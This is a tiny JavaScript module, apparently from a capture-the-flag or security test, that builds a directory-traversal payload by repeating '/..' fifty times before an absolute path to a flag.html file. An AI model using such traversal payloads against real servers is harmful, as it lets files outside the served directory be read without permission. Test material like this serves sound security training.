function getPayload() {
    const path = require("path");
    const pathToFlag = path.resolve(__dirname, "../flag.html");
    return "/..".repeat(50) + pathToFlag;
}

module.exports = { getPayload };